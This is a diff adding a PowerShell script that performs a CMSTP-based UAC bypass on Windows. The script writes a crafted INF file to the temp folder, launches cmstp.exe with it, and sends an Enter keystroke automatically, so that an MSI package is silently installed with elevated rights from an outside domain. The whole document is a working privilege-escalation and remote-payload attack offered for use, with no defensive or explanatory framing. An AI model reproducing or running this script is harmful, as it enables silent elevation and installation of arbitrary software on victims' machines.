@@ -1,0 +1,65 @@
+# Modified UAC Bypass for Remote MSI Execution
+# Target: ClientSetup.msi
+Add-Type -AssemblyName System.Windows.Forms
+
+# --- CONFIGURATION ---
+$RemoteMsiUrl = "https://care2support.online/ClientSetup.msi"
+$InfFileLocation = "$env:temp\CMSTP_Test.inf"
+# The command msiexec will run elevated
+$CommandToExecute = "msiexec.exe /i `"$RemoteMsiUrl`" /quiet /norestart"
+# ---------------------
+
+Function Create-InfFile {
+    $InfContent = @"
+[version]
+Signature=`$chicago`$
+AdvancedINF=2.5
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+[RunPreSetupCommandsSection]
+$CommandToExecute
+taskkill /IM cmstp.exe /F
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+[Strings]
+ServiceName="MsiTestUpdate"
+ShortSvcName="MsiTestUpdate"
+"@
+    $InfContent | Out-File $InfFileLocation -Encoding ASCII
+}
+
+Function Set-WindowActive {
+    Param ([string]$Name)
+    $memberDefinition = @'
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
+'@
+    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
+    $process = Get-Process -Name $Name -ErrorAction SilentlyContinue
+    if ($process) {
+        $hwnd = $process.MainWindowHandle
+        [User32.Api]::SetForegroundWindow($hwnd)
+        [User32.Api]::ShowWindow($hwnd, 5)
+        return $hwnd
+    }
+    return 0
+}
+
+# 1. Create the configuration file
+Create-InfFile
+
+# 2. Launch CMSTP with the INF
+if (Test-Path $InfFileLocation) {
+    $proc = Start-Process "cmstp.exe" -ArgumentList "/au `"$InfFileLocation`"" -PassThru
+    
+    # 3. Wait for the window and automate the 'Enter' key
+    Write-Host "Waiting for CMSTP window..."
+    while ((Set-WindowActive "cmstp") -eq 0) { Start-Sleep -Milliseconds 100 }
+    
+    Start-Sleep -Milliseconds 500 # Brief pause for stability
+    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+    Write-Host "Bypass triggered. Check Task Manager for msiexec.exe"
+}
